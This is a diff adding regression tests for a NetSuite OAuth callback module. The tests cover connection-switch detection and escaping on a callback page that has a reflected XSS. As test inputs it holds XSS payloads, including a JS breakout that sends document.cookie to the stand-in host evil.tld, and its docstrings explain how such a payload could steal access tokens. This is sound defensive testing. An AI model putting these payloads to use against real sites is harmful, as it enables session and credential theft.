@@ -22,6 +22,7 @@ from app.api.v1.netsuite_auth import (
     ACCOUNT_SWITCHED_HTML,
     CALLBACK_HTML,
     _js_string,
+    _render_callback,
     _select_connection_for_account,
     _supersede_other_connections,
 )
@@ -387,3 +388,92 @@ def test_switch_prefers_a_live_error_row_over_a_superseded_one():
 
     assert switched_from == PROD, "must name the live (error) row, not the retired one"
     assert selected is dead_prod
+
+
+def test_matching_a_non_serving_row_while_another_serves_reads_is_a_switch():
+    """Gate round 6, major -- and a regression from round 5's own fix.
+
+    Widening the "already bound" test from active rows to ALL live rows (so that a
+    switch off an `error` row would be reported) made the test match a row that is
+    NOT serving reads. Tenant is live on prod; a stale sandbox row sits in `error`.
+    Re-authorizing sandbox matched that error row, concluded "this account is already
+    the tenant's binding", and returned switched_from=None -- while
+    `_supersede_other_connections` demoted the prod row underneath and every SuiteQL
+    read moved to sandbox. The silent repoint, back again through a new door.
+
+    The two questions need two different populations:
+      - "is this account already serving reads?"  -> rows that actually serve (active)
+      - "which account is losing reads?"          -> those, else any non-retired row
+    """
+    serving_prod = _conn(PROD)  # active: this is what every consumer reads today
+    stale_sandbox = _conn(SANDBOX)
+    stale_sandbox.status = "error"
+
+    selected, switched_from = _select_connection_for_account([serving_prod, stale_sandbox], SANDBOX)
+
+    assert selected is stale_sandbox, "reclaim the row bound to the incoming account"
+    assert switched_from == PROD, "prod is about to be superseded and reads move to sandbox — that is a switch"
+
+
+def test_reauth_of_the_serving_account_with_a_stale_error_sibling_is_not_a_switch():
+    """The mirror case: nothing moves, so nothing should be announced."""
+    serving_prod = _conn(PROD)
+    stale_sandbox = _conn(SANDBOX)
+    stale_sandbox.status = "error"
+
+    selected, switched_from = _select_connection_for_account([serving_prod, stale_sandbox], PROD)
+
+    assert selected is serving_prod
+    assert switched_from is None
+
+
+# ---------------------------------------------------------------------------
+# The generic callback page escapes too -- it renders UNTRUSTED input as well
+# ---------------------------------------------------------------------------
+
+
+def test_callback_page_escapes_the_error_param_in_both_contexts():
+    """Gate round 6, blocker. The escaper shipped, but only next door.
+
+    `/callback` takes `error` straight off the query string and renders it before any
+    state or Redis validation, with no auth on the route -- so this is an
+    unauthenticated reflected XSS on the API origin. It lands in TWO contexts:
+    `<p>{message}</p>` and, inside the inline <script>, `error: "{error_detail}"`.
+
+    That matters more than a normal reflected XSS here: there is no CSP on the API
+    origin, and the refresh cookie is host-only on it with `path=/api/v1/auth`, so
+    injected script can POST /api/v1/auth/refresh same-origin and read a fresh access
+    token straight out of the JSON body. HttpOnly does not help against same-origin
+    script.
+    """
+    hostile_html = "<img src=x onerror=alert(1)>"
+    hostile_js = '"+fetch("//evil.tld?c="+document.cookie)+"'
+
+    rendered = _render_callback(
+        status="error",
+        heading="Authentication Failed",
+        message=f"NetSuite returned an error: {hostile_html}",
+        event_type="NETSUITE_AUTH_ERROR",
+        error_detail=hostile_js,
+    )
+
+    # HTML body context
+    assert hostile_html not in rendered, "raw payload reached the HTML body"
+    assert "&lt;img" in rendered, "payload should be escaped, not stripped"
+
+    # JS string context — the concat breakout must not survive as live JS
+    assert 'fetch("//evil.tld' not in rendered, "payload broke out of the JS string"
+
+
+def test_callback_page_escaping_survives_a_script_close():
+    """`</script>` must not be able to terminate the element early."""
+    rendered = _render_callback(
+        status="error",
+        heading="Authentication Failed",
+        message="boom",
+        error_detail="</script><script>alert(1)</script>",
+        event_type="NETSUITE_AUTH_ERROR",
+    )
+
+    assert "</script><script>" not in rendered
+    assert "\\u003c" in rendered, "angle brackets should be \\u-escaped in the JS context"
